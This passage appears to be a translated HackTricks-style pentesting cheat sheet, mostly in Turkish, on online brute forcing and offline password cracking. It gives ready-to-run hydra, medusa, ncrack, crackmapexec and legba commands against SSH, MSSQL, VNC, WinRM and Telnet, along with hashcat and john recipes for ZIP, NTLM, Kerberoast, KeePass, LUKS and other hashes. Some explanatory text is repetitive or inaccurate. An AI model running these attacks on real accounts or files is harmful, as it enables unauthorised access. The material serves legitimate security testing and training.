- Güçlü ve karmaşık şifreler kullanın.
- Şifreleri düzenli olarak değiştirin.
- Oturum açma denemelerini sınırlayın ve otomatik olarak hesapları kilitleyin.
- İki faktörlü kimlik doğrulama kullanın.
- Güvenlik duvarı ve ağ filtreleme kullanarak erişimi sınırlayın.

Brute force saldırılarına karşı korunmak için güvenlik en iyi uygulamalarını takip etmek önemlidir.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
SSH (Secure Shell), güvenli bir uzaktan erişim protokolüdür. SSH, ağ üzerinden güvenli bir şekilde komut satırı erişimi sağlar ve verilerin şifrelenmesini sağlar. SSH, sunucu ve istemci arasında güvenli bir bağlantı kurmak için kullanılır.

SSH brute force saldırısı, bir saldırganın SSH sunucusuna erişmek için bir dizi olası kullanıcı adı ve şifre kombinasyonunu denemesidir. Bu saldırı, zayıf veya tahmin edilebilir şifreler kullanılarak korunan SSH sunucularını hedef alır.

SSH brute force saldırılarını önlemek için bazı önlemler alınabilir. Bunlar arasında güçlü ve karmaşık şifreler kullanmak, oturum açma denemelerini sınırlamak, IP adresi tabanlı erişim kontrolü yapmak ve çok faktörlü kimlik doğrulama kullanmak bulunur.

SSH brute force saldırılarına karşı korunmak için güvenlik bilincinin artırılması ve güvenlik önlemlerinin uygulanması önemlidir. Ayrıca, güncellemeleri takip etmek ve güvenlik açıklarını düzeltmek de önemlidir.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Zayıf SSH anahtarları / Debian tahmin edilebilir PRNG

Bazı sistemlerde, şifreleme materyali oluşturmak için kullanılan rastgele tohumda bilinen hatalar bulunmaktadır. Bu, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla kaba kuvvet saldırısıyla kırılabilecek dramatik bir şekilde azaltılmış bir anahtar alanıyla sonuçlanabilir. Zayıf anahtarların önceden oluşturulmuş setleri de mevcuttur, örneğin [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ ve OpenMQ)

STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler mesaj kuyruğu hizmetleriyle sorunsuz iletişim ve etkileşim sağlayan yaygın olarak kullanılan bir mesajlaşma protokolüdür. Mesajları değiş tokuş etmek ve çeşitli mesajlaşma işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
Telnet, bir ağ protokolüdür ve bir bilgisayarın uzaktan başka bir bilgisayara bağlanmasını sağlar. Telnet, bir sunucuya erişmek için kullanıcı adı ve şifre gibi kimlik doğrulama bilgilerini gerektirir. Brute force saldırısı, bir saldırganın Telnet protokolünü kullanarak bir sunucuya erişmek için tüm olası kullanıcı adı ve şifre kombinasyonlarını denemesidir. Bu saldırı yöntemi, zayıf veya tahmin edilebilir kimlik doğrulama bilgilerine sahip olan sistemlere karşı etkili olabilir.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing), sanal bir masaüstü protokolüdür. VNC, bir bilgisayara uzaktan erişim sağlamak için kullanılır ve genellikle sunucu ve istemci olarak iki bileşenden oluşur. Sunucu, uzaktaki bilgisayarın ekranını paylaşırken, istemci, sunucuya bağlanarak uzaktaki bilgisayara erişir.

Brute force saldırıları, VNC sunucularını hedef alabilir. Bu saldırılar, kullanıcı adı ve parola kombinasyonlarını deneyerek sunucuya yetkisiz erişim sağlamayı amaçlar. Brute force saldırıları, genellikle zayıf veya tahmin edilebilir parolaları hedef alır.

Brute force saldırılarını önlemek için bazı önlemler alınabilir. Bunlar arasında güçlü parolalar kullanmak, oturum açma denemelerini sınırlamak, IP adresi tabanlı engelleme uygulamak ve iki faktörlü kimlik doğrulama kullanmak bulunur.

VNC sunucularınızı güvende tutmak için güvenlik önlemlerini uygulamak önemlidir. Bu, yetkisiz erişimi önlemek ve hassas verilerinizi korumak için gereklidir.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm, Windows Remote Management, Windows işletim sistemlerinde uzaktan yönetimi sağlayan bir protokoldür. Winrm, Windows PowerShell komutlarını ve diğer yönetim araçlarını uzaktan çalıştırmak için kullanılır. Bu protokol, ağ üzerinden güvenli bir şekilde iletişim kurmak için HTTPS üzerinden çalışır.

Winrm, brute force saldırılarına karşı savunmasız olabilir. Brute force saldırıları, bir saldırganın tüm olası şifre kombinasyonlarını deneyerek bir hesaba erişmeye çalıştığı saldırılardır. Bu tür saldırılar, zayıf veya tahmin edilebilir şifreler kullanıldığında etkili olabilir.

Winrm brute force saldırılarını önlemek için aşağıdaki önlemleri alabilirsiniz:

- Güçlü şifreler kullanın: Karmaşık ve tahmin edilemez şifreler kullanarak saldırganların şifreleri tahmin etmelerini zorlaştırın.
- Şifre politikalarını uygulayın: Şifre politikaları belirleyerek kullanıcıların güçlü şifreler kullanmasını zorunlu hale getirin.
- Hesap kilitlenmesini etkinleştirin: Belirli bir süre içinde yanlış şifre denemeleri yapıldığında hesapları otomatik olarak kilitlenmesini sağlayın.
- İki faktörlü kimlik doğrulama kullanın: İki faktörlü kimlik doğrulama, kullanıcıların şifrelerinin yanı sıra başka bir doğrulama yöntemi kullanmalarını gerektirir.

Bu önlemleri alarak Winrm brute force saldırılarına karşı güvenliğinizi artırabilirsiniz.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yerel

### Çevrimiçi kırma veritabanları

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 ve SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 ESS/SSP ile/olmadan ve herhangi bir meydan okuma değeriyle)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 yakalamaları ve MSOffice, ZIP, PDF arşivleri...)
* [https://crackstation.net/](https://crackstation.net) (Hash'ler)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hash'ler ve dosya hash'leri)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hash'ler)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hash'ler)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hash kuvvet saldırısı yapmadan önce bunları kontrol edin.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bilinen metin zip saldırısı

Şifrelenmiş bir zip içindeki bir dosyanın **açık metnini** (veya açık metnin bir kısmını) bilmelisiniz. Şifrelenmiş bir zip içindeki dosyaların **dosya adlarını ve dosya boyutunu** kontrol etmek için **`7z l encrypted.zip`** komutunu çalıştırabilirsiniz. [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)'i yayın sayfasından indirin.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z, ağır şifreleme ve sıkıştırma özellikleri sunan bir dosya arşivleme formatıdır. 7z dosyaları, genellikle .7z uzantısıyla tanımlanır. Bu format, diğer arşivleme formatlarına göre daha yüksek sıkıştırma oranları sağlar.

7z dosyalarının şifrelenmiş olması durumunda, brute force saldırıları kullanılarak şifre kırılabilir. Brute force saldırısı, tüm olası şifre kombinasyonlarını deneyerek doğru şifreyi bulmaya çalışır. Bu saldırı yöntemi, şifrenin zayıf olduğu durumlarda etkili olabilir.

Brute force saldırısı için çeşitli araçlar ve yöntemler mevcuttur. Bu saldırıları gerçekleştirmek için genellikle özel yazılımlar veya scriptler kullanılır. Ancak, brute force saldırıları zaman alıcı ve kaynak yoğun olabilir, bu nedenle hedefin şifresinin zayıf olduğu kesinleştiğinde tercih edilir.

7z dosyalarının brute force saldırılarına karşı korunması için güçlü ve karmaşık şifreler kullanılması önemlidir. Şifrelerin uzun, rastgele karakterlerden oluşması ve farklı karakter türlerini içermesi önerilir. Ayrıca, şifrelerin düzenli olarak değiştirilmesi ve güncellenmesi de önemlidir.

7z dosyalarının brute force saldırılarına karşı korunması için diğer bir yöntem ise şifre deneme sınırının belirlenmesidir. Şifre deneme sınırı, belirli bir süre içinde yapılabilecek şifre denemelerinin sayısını sınırlar. Bu, brute force saldırılarını zorlaştırabilir ve şifre kırma sürecini yavaşlatabilir.

Sonuç olarak, 7z dosyalarının brute force saldırılarına karşı korunması için güçlü şifreler kullanılmalı ve şifre deneme sınırı belirlenmelidir. Ayrıca, güvenlik açığı olabilecek zayıf şifrelerden kaçınılmalı ve şifreler düzenli olarak güncellenmelidir.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# Brute Force (Kaba Kuvvet) 

Kaba kuvvet saldırısı, bir hedefin şifresini veya kimlik doğrulama bilgilerini tahmin etmek için bir dizi olası kombinasyonu denemek amacıyla kullanılan bir saldırı yöntemidir. Bu saldırı yöntemi, oturum açma sayfaları, şifre korumalı dosyalar veya ağ cihazları gibi güvenlik önlemleriyle korunan sistemlere karşı kullanılabilir.

Kaba kuvvet saldırıları genellikle şifreleme algoritmalarının zayıf noktalarını hedefler. Saldırganlar, şifreleme algoritmasının kullanıldığı sistemdeki şifreleme anahtarını veya şifreleme algoritmasının kendisini kırmak için bir dizi olası değeri deneyerek hedefin şifresini bulmaya çalışır.

Bu saldırı yöntemi, saldırganın sahip olduğu hesap bilgilerini veya şifreleme anahtarını korumak için güçlü güvenlik önlemleri almayan sistemlerde etkili olabilir. Bu nedenle, güçlü ve karmaşık şifreler kullanmak, hesaplarınızı ve sistemlerinizi kaba kuvvet saldırılarına karşı korumak için önemlidir.

Kaba kuvvet saldırıları, genellikle otomatik araçlar veya yazılımlar kullanılarak gerçekleştirilir. Bu araçlar, bir hedefin şifresini veya kimlik doğrulama bilgilerini tahmin etmek için bir dizi olası kombinasyonu otomatik olarak deneyebilir. Saldırganlar, bu araçları kullanarak hedef sistemlere büyük miktarda giriş yapabilir ve şifreleri veya kimlik doğrulama bilgilerini elde edebilir.

Kaba kuvvet saldırılarına karşı korunmanın birkaç yolu vardır. İlk olarak, güçlü ve karmaşık şifreler kullanmak önemlidir. Şifrelerinizi düzenli olarak değiştirmek ve aynı şifreyi birden fazla hesapta kullanmaktan kaçınmak da önemlidir. Ayrıca, hesaplarınızı ve sistemlerinizi korumak için çift faktörlü kimlik doğrulama gibi ek güvenlik önlemleri kullanabilirsiniz.

Sonuç olarak, kaba kuvvet saldırıları, şifreleri veya kimlik doğrulama bilgilerini tahmin etmek için bir dizi olası kombinasyonu deneyen bir saldırı yöntemidir. Bu saldırılara karşı korunmak için güçlü şifreler kullanmak ve ek güvenlik önlemleri almak önemlidir.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Sahibi Şifresi

Bir PDF sahibi şifresini kırmak için şunu kontrol edin: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM kırma

NTLM (NT LAN Manager), Windows işletim sistemlerinde kullanılan bir kimlik doğrulama protokolüdür. NTLM kırma, bir saldırganın NTLM hash'ini elde etmek ve ardından bu hash'i çözmek için kullanılan bir tekniktir. NTLM hash'i, kullanıcının parolasının yerine geçen bir değerdir ve saldırganın parolayı elde etmesine olanak sağlar.

NTLM kırma genellikle brute force saldırılarıyla gerçekleştirilir. Brute force saldırısı, tüm olası parola kombinasyonlarını deneyerek doğru parolayı bulmaya çalışır. Bu saldırı yöntemi, zayıf veya tahmin edilebilir parolaları olan kullanıcı hesaplarını hedef alır.

NTLM kırma için kullanılan bazı araçlar şunlardır:

- **John the Ripper**: Parola kırma aracı olarak kullanılan popüler bir yazılımdır. NTLM hash'lerini çözmek için kullanılabilir.
- **Hashcat**: Yüksek performanslı bir parola kırma aracıdır. NTLM hash'lerini çözmek için kullanılabilir.
- **Medusa**: Çoklu hedef desteği olan bir brute force saldırı aracıdır. NTLM kırma için kullanılabilir.

NTLM kırma işlemi, güçlü parolalar kullanarak hesap güvenliğini artırmak için önemlidir. Kullanıcıların karmaşık ve tahmin edilemez parolalar kullanmaları, NTLM kırma saldırılarına karşı daha dirençli olmalarını sağlar.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
Keepass, a popular open-source password manager, is a valuable tool for securely storing and managing passwords. It uses strong encryption algorithms to protect your passwords and allows you to generate strong, unique passwords for each of your accounts.

One potential weakness of Keepass is the possibility of brute-force attacks. Brute-force attacks involve systematically trying every possible combination of characters until the correct password is found. To protect against brute-force attacks, Keepass includes several security features.

Firstly, Keepass allows you to set a master password, which is required to access your password database. It is important to choose a strong master password that is not easily guessable. Avoid using common words or phrases and consider using a combination of uppercase and lowercase letters, numbers, and special characters.

Additionally, Keepass includes a feature called key transformation, which adds an extra layer of security to the master password. Key transformation involves applying a series of cryptographic transformations to the master password, making it more difficult for an attacker to guess or crack the password.

To further enhance security, Keepass also supports the use of key files. A key file is a separate file that is required in addition to the master password to unlock the password database. This adds an extra layer of protection, as an attacker would need both the master password and the key file to gain access.

It is important to regularly update your master password and key file to ensure the security of your password database. Additionally, consider enabling two-factor authentication (2FA) if supported by your Keepass implementation. 2FA adds an extra layer of security by requiring a second form of authentication, such as a fingerprint or a one-time password, in addition to the master password and key file.

By following these security practices and regularly updating your master password and key file, you can significantly reduce the risk of brute-force attacks on your Keepass password database.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
Keberoasting, bir saldırganın Active Directory (AD) ortamında zayıf şifrelenmiş hesapları keşfetmek için kullanılan bir saldırı tekniğidir. Bu saldırı, AD ortamında Kerberos ön bellek saldırısı yaparak gerçekleştirilir.

Keberoasting saldırısı, hedef AD ortamında SPN (Service Principal Name) olarak bilinen hesapları hedefler. SPN'ler, bir servisin AD'deki kimlik doğrulamasını temsil eder. Bu hesaplar genellikle servis hesaplarıdır ve genellikle uzun süreli şifrelerle korunurlar.

Saldırgan, hedef AD ortamında SPN'leri keşfeder ve ardından bu hesapların şifrelerini zayıf bir şekilde şifrelenmiş olanlarını belirler. Daha sonra, saldırgan bu zayıf şifrelenmiş hesapları çalmak için Kerberos ön bellek saldırısı kullanır.

Keberoasting saldırısı, saldırganın hedef AD ortamında kimlik doğrulama bilgilerini elde etmesine ve bu hesapları kötüye kullanmasına olanak tanır. Bu saldırı, saldırganın hedef ağda ilerlemesine ve daha fazla yetki elde etmesine yardımcı olabilir.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks görüntüsü

#### Yöntem 1

Yükle: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Yöntem 2

##### Brute Force

##### Brut Kuvvet

Brute force is a technique used to crack passwords or encryption by systematically trying all possible combinations until the correct one is found. It is a time-consuming method but can be effective if the password is weak or the encryption algorithm is vulnerable.

Brute force, doğru olanı bulana kadar tüm olası kombinasyonları sistemli bir şekilde deneyerek şifreleri veya şifrelemeleri kırmak için kullanılan bir tekniktir. Zaman alıcı bir yöntem olmasına rağmen, şifre zayıf ise veya şifreleme algoritması savunmasız ise etkili olabilir.

There are different types of brute force attacks, including:

Brute force saldırılarının farklı türleri vardır, bunlar:

- **Online brute force**: In this type of attack, the hacker tries different combinations of passwords or encryption keys directly on the target system or application. This method requires a direct connection to the target and can be easily detected and blocked by security measures such as account lockouts or rate limiting.

- **Çevrimiçi brute force**: Bu saldırı türünde, hacker şifreleri veya şifreleme anahtarlarını doğrudan hedef sistem veya uygulamada farklı kombinasyonlarla dener. Bu yöntem, hedefe doğrudan bir bağlantı gerektirir ve hesap kilitlenmeleri veya hız sınırlamaları gibi güvenlik önlemleri tarafından kolayca tespit edilebilir ve engellenebilir.

- **Offline brute force**: In this type of attack, the hacker obtains a copy of the encrypted data and performs the brute force attack offline, without direct access to the target system. This can be done by stealing a password hash database or capturing encrypted network traffic. Offline brute force attacks are usually more difficult to detect and can take longer to crack the password or encryption.

- **Çevrimdışı brute force**: Bu saldırı türünde, hacker şifrelenmiş verilerin bir kopyasını elde eder ve brute force saldırısını doğrudan hedef sistemine erişim olmadan çevrimdışı olarak gerçekleştirir. Bu, bir şifre hash veritabanını çalmak veya şifrelenmiş ağ trafiğini yakalamak suretiyle yapılabilir. Çevrimdışı brute force saldırıları genellikle daha zor tespit edilir ve şifre veya şifreleme kırılması daha uzun sürebilir.

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockouts or rate limiting, and use multi-factor authentication. Additionally, using strong encryption algorithms and regularly updating software can help mitigate the risk of brute force attacks.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Başka bir Luks BF öğretici: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Özel Anahtarı

PGP (Pretty Good Privacy) veya GPG (GNU Privacy Guard) özel anahtarı, şifreleme ve dijital imza işlemlerinde kullanılan bir anahtardır. Bu anahtar, kullanıcının kimliğini doğrulamak ve iletişimi güvence altına almak için kullanılır.

Özel anahtar, genellikle bir dosya veya metin biçiminde saklanır. Bu anahtara sahip olan kişi, şifrelenmiş mesajları çözebilir ve dijital imzaları doğrulayabilir. Bu nedenle, özel anahtarın güvenli bir şekilde saklanması ve yetkisiz erişimden korunması önemlidir.

Brute force saldırısı, bir saldırganın tüm olası anahtar kombinasyonlarını deneyerek özel anahtarı bulmaya çalıştığı bir saldırı yöntemidir. Bu saldırı yöntemi, güçlü bir şifreleme algoritması kullanıldığında oldukça zorlu hale gelir. Ancak, zayıf bir şifreleme algoritması veya zayıf bir özel anahtar kullanıldığında, brute force saldırıları daha etkili olabilir.

Brute force saldırılarına karşı korunmanın en iyi yolu, güçlü bir şifreleme algoritması kullanmak ve özel anahtarın güvenliğini sağlamaktır. Özel anahtarın güvenli bir şekilde saklanması için şifrelenmiş bir dosya veya donanım cüzdanı kullanılabilir. Ayrıca, güçlü bir şifre seçmek ve özel anahtarı yetkisiz erişimden korumak için çift faktörlü kimlik doğrulama gibi ek güvenlik önlemleri almak da önemlidir.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Anahtarını Kırmak

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) adresinden DPAPI anahtarını kırmak için DPAPImk2john.py aracını indirin ve ardından john aracını kullanın.

### Open Office Şifre Korumalı Sütun

Eğer bir xlsx dosyasında bir sütun şifre ile korunuyorsa, şifreyi kaldırabilirsiniz:

* **Google Drive'a yükleyin** ve şifre otomatik olarak kaldırılacaktır.
* **Manuel olarak** kaldırmak için:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX Sertifikaları

PFX sertifikaları, genellikle Windows işletim sistemlerinde kullanılan bir sertifika formatıdır. PFX, kişisel bilgisayarlar ve sunucular arasında güvenli iletişimi sağlamak için kullanılır. PFX sertifikaları, genellikle bir özel anahtar ve ilgili bir kamu anahtarını içerir.

PFX sertifikalarını kırmak veya çözmek için brute force saldırıları kullanılabilir. Brute force saldırıları, tüm olası kombinasyonları deneyerek şifreyi tahmin etmeye çalışır. Bu saldırılar genellikle zaman alıcıdır, çünkü şifrenin karmaşıklığına bağlı olarak çok sayıda deneme yapılması gerekebilir.

PFX sertifikalarını kırmak için kullanılan bazı brute force araçları şunlardır:

- Hydra: Çoklu protokol desteği olan bir brute force aracıdır.
- Medusa: Çoklu protokol desteği olan bir brute force aracıdır.
- John the Ripper: Şifre kırma ve brute force saldırıları için popüler bir araçtır.

PFX sertifikalarını kırmak için brute force saldırıları gerçekleştirirken, güçlü bir şifre listesi kullanmak önemlidir. Şifre listesi, yaygın kullanılan şifreleri, kelime listelerini ve diğer olası şifre kombinasyonlarını içermelidir.

Brute force saldırıları, PFX sertifikalarını kırmak için kullanılan bir yöntem olmasına rağmen, bu saldırıların başarı şansı şifrenin karmaşıklığına bağlıdır. Güçlü ve karmaşık bir şifre kullanarak PFX sertifikalarınızı korumak önemlidir.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Araçlar

**Hash örnekleri:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Kelime Listeleri

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Kelime Listesi Oluşturma Araçları**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Yapılandırılabilir temel karakterler, tuş haritası ve rotaları olan gelişmiş klavye dolaşımı üreteci.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John mutasyonu

_**/etc/john/john.conf**_ dosyasını okuyun ve yapılandırın.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat saldırıları

* **Wordlist saldırısı** (`-a 0`) kurallarla birlikte

**Hashcat**, zaten **kurallar içeren bir klasörle birlikte gelir** ancak [**burada başka ilginç kurallar bulabilirsiniz**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Kelime listesi birleştirme** saldırısı

Hashcat ile 2 kelime listesi **birleştirilebilir**.\
Eğer 1. liste **"hello"** kelimesini içeriyorsa ve ikinci liste **"world"** ve **"earth"** kelimelerini içeriyorsa, `helloworld` ve `helloearth` kelimeleri oluşturulacaktır.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
